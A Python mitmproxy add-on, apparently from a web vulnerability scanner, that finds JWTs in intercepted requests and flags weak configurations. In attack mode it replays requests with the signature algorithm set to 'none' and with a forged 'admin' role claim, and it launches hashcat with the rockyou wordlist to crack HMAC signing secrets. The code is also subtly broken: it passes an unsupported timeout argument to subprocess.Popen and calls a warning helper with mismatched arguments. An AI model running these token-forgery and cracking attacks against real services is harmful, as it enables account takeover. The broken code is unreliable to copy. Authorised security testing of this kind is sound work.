import base64
from helpers.log import log
import jwt
import json
from mitmproxy import http, ctx
from helpers.helpers import Helpers
import copy
import subprocess
import tempfile
from pathlib import Path
import os
import time
import re
import threading

class JWTAnalyzer:
    fuzzedJWTs = set()
    runningHashcats = []

    BASE_DIR = Path(__file__).resolve().parent
    hashcat = BASE_DIR / "../third-party/hashcat/hashcat.exe"
    rockyouwordlist = BASE_DIR / "../third-party/hashcat/wordlists/seclists/rockyou.txt"
    jwtsecretswordlist = BASE_DIR / "../third-party/wordlists/jwt-secrets/jwt.secrets.list"

    def lookForJWTS(flow: http.HTTPFlow):
        # From Authorization header
        AUTHORIZATION = flow.request.headers.get("Authorization", "")
        if AUTHORIZATION.startswith("Bearer "):
            log.debug("Evaluating JWT from the Authorization header")
            JWTAnalyzer.evaluateJWT(AUTHORIZATION.split(" ")[1], flow)

        # From Cookie header
        matches = re.findall("token=((?:[a-zA-Z0-9_-]+\\.){2}[a-zA-Z0-9_-]+)", flow.request.headers.get("Cookie", ""))
        if len(matches) != 0 and matches[0] is not None:
            log.debug("Evaluating JWT from the Cookie header")
            for match in matches:
                JWTAnalyzer.evaluateJWT(match, flow)

        # From URL
        matches = re.findall("token=((?:[a-zA-Z0-9_-]+\\.){2}[a-zA-Z0-9_-]+)", flow.request.url)
        matches.extend(re.findall("jwt=((?:[a-zA-Z0-9_-]+\\.){2}[a-zA-Z0-9_-]+)", flow.request.url))

        if len(matches) != 0 and matches[0] is not None:
            log.debug("Evaluating JWT from the URL")
            for match in matches:
                Helpers.logVulnerability(flow, f"JWT found in URL: {match}", flow.request.url)
                JWTAnalyzer.evaluateJWT(match, flow)


    def evaluateJWT(JWT, flow):
        if "Active-Attack" in flow.request.headers.get("X-Fuzzer", ""):
            JWTAnalyzer.evaluateAttackResponse(flow, flow.request.headers.get("X-Fuzzer"))
            return

        if JWT in JWTAnalyzer.fuzzedJWTs:
            return
        
        if len(JWT.split(".")) != 3:
            return


        log.info(f"JWT extracted for path {flow.request.url}: {JWT}. Evaluating...")
        JWTAnalyzer.fuzzedJWTs.add(JWT)

        try:
            unverifiedHeader = jwt.get_unverified_header(JWT)
            unverifiedPayload = jwt.decode(JWT, options={"verify_signature": False})

            alg = unverifiedHeader.get("alg", "").lower()
            if alg == "none":
                Helpers.logWarning("JWT 'none' algorithm is used by the client")
            
            if alg == "hs256":
                Helpers.logWarning(flow, f"JWT uses symmetric HS256. Risk of secret brute-forcing.", flow.request.url)

            if "exp" not in unverifiedPayload:
                Helpers.logWarning(flow, f"JWT is missing an expiration timestamp ('exp' claim)", flow.request.url)

            if ctx.options.useAttackMode == True:
                # Attack no. 1
                sensitiveKeywords = ["password", "secret", "token", "key", "username", "email", "ssn", "role", "admin"]
                lowerPayload = {
                    k.lower(): copy.deepcopy(v)
                    for k, v in unverifiedPayload.items()
                }

                for keyword in sensitiveKeywords:
                    if keyword in lowerPayload:
                        Helpers.logWarning(f"Potential sensitive data leakage; JWT payload contains keyword '{keyword}': {json.dumps(lowerPayload, indent=4)}")
                        
                        if keyword == "role":
                            JWTAnalyzer.attackClaimChange(flow, JWT, "role", "admin", lowerPayload[keyword])
                
                # Attack no. 2
                JWTAnalyzer.attackWithAlgNone(flow, JWT)
                # Attack no. 3
                JWTAnalyzer.attackWithHashcat(JWT)
        
        except Exception as e:
            log.exception(e)

    # ATTACK: Replay request with algorithm none
    def attackWithAlgNone(flow, JWT):
        log.debug("ATTACK: JWT algorithm switched to none")
        JWTwithAlgNone = None

        try:
            header64, payload64, _ = JWT.split(".")
            paddedHeader = header64 + "=" * divmod(len(header64), 4)[1]
            headerJSON = json.loads(base64.urlsafe_b64decode(paddedHeader))

            headerJSON["alg"] = "none"

            newHeaderBytes = json.dumps(headerJSON).encode("utf-8")
            newHeader64 = base64.urlsafe_b64encode(newHeaderBytes).decode("utf-8").rstrip("=")

            JWTwithAlgNone = f"{newHeader64}.{payload64}."

        except Exception as e:
            log.exception(f"Failed to change JWT algorithm to none")

        if JWTwithAlgNone == None:
            log.info("Couldn't carry out JWT 'none' algorithm attack")
            return

        attackFlow = flow.copy()

        attackFlow.request.headers["X-Fuzzer"] = "Active-Attack-AlgNone"
        attackFlow.request.headers["Authorization"] = f"Bearer {JWTwithAlgNone}"

        attackFlow.metadata["originalStatus"] = flow.response.status_code
        log.debug(f"status_code {flow.response.status_code}")
        ctx.master.commands.call("replay.client", [attackFlow])


    def attackClaimChange(flow, JWT, claimToChange, newClaimValue, previousValue):
        log.debug(f"ATTACK: JWT claim {claimToChange} switched to {newClaimValue} from {previousValue}")
        JWTWithClaimChanged = None

        try:
            header64, payload64, signature64 = JWT.split(".")
            paddedPayload = payload64 + "=" * divmod(len(payload64), 4)[1]
            payloadJSON = json.loads(base64.urlsafe_b64decode(paddedPayload))

            payloadJSON[claimToChange] = newClaimValue

            newPayloadBytes = json.dumps(payloadJSON).encode("utf-8")
            newPayload64 = base64.urlsafe_b64encode(newPayloadBytes).decode("utf-8").rstrip("=")

            JWTWithClaimChanged = f"{header64}.{newPayload64}.{signature64}"

        except Exception as e:
            log.exception(f"Failed to change claim {claimToChange} to {newClaimValue}")
        
        if JWTWithClaimChanged == None:
            log.info("Couldn't carry out JWT role change attack")
            return

        attackFlow = flow.copy()

        attackFlow.request.headers["X-Fuzzer"] = "Active-Attack-Claim"
        attackFlow.request.headers["Authorization"] = f"Bearer {JWTWithClaimChanged}"

        attackFlow.metadata["originalStatus"] = flow.response.status_code
        log.info(f"status_code {flow.response.status_code}")
        ctx.master.commands.call("replay.client", [attackFlow])


    def logHashcatOutput(process):
        for line in process.stdout:
            log.hashcat(line.rstrip("\r\n"))


    def attackWithHashcat(JWT):
        log.debug(f"ATTACK: Checking if Hashcat attack is possible")

        # Checking if the header lists a compatible signing algorithm
        header64, _, _ = JWT.split(".")
        paddedHeader = header64 + "=" * divmod(len(header64), 4)[1]
        headerJSON = json.loads(base64.urlsafe_b64decode(paddedHeader))

        if headerJSON["alg"] == "HS256" or headerJSON["alg"] == "HS384" or headerJSON["alg"] == "HS512":
            # with tempfile.NamedTemporaryFile(mode="w", encoding='utf-8', delete=False) as f:
            
            with open("jwt.txt", "w", encoding="utf-8") as f:
                f.write(JWT)

            try:
                log.info("Starting Hashcat attack")

                # "Status...........: Cracked"
                process = subprocess.Popen(
                    ["./third-party/hashcat/hashcat.exe", # subprocess executing from root folder
                     "-a", "1", 
                     "-m", "16500",
                    #  "--machine-readable",
                    #  "--status", # periodically show status info
                     "../../jwt.txt", # relative to /third-party/hashcat folder
                     "./wordlists/seclists/rockyou.txt", "./wordlists/jwt-secrets/jwt.secrets.list"], # relative to /third-party/hashcat folder
                    text=True,
                    cwd="./third-party/hashcat",
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=120
                )

                JWTAnalyzer.runningHashcats.append({"isRunning": 1, "process": process}) # 1 for running, 0 for finished

                outputThread = threading.Thread(target=JWTAnalyzer.logHashcatOutput, args=(process,), daemon=True)
                outputThread.start()

            except subprocess.TimeoutExpired:
                log.warning("Hashcat attack timed out after 120s - terminating process")
                process.kill()
                process.wait()
            except Exception as e:
                log.exception("Hashcat attack failed with exception: ", e)
        else:
            log.info(f"Skipping Hashcat attack due to an incompatible signing algorithm: {headerJSON['alg']}")


    def evaluateAttackResponse(attackFlow: http.HTTPFlow, attackHeader):
        log.debug("Evaluating attack response")
        originalStatus = attackFlow.metadata.get("originalStatus")
        log.debug(f"Original HTTP status: {originalStatus}")
        attackStatus = attackFlow.response.status_code
        log.debug(f"New HTTP status: {attackStatus}")
        path = attackFlow.request.url

        message = ""
        if attackStatus in [401, 403, 500]:
            match attackHeader:
                case "Active-Attack-AlgNone":
                    message = "rejected 'alg: none' signature bypass"
                case "Active-Attack-Claim":
                    message = "rejected claim change"
                    
            log.info(f"[✓] Secure: Server successfully {message} on {path} ({attackStatus})")
        elif attackStatus == 200 or attackStatus == originalStatus:
            match attackHeader:
                case "Active-Attack-AlgNone":
                    message = "'alg: none' signature accepted"
                case "Active-Attack-Claim":
                    message = "role claim change accepted"

            Helpers.vulnerabilityFound(f"{message} on {path} ({attackStatus})")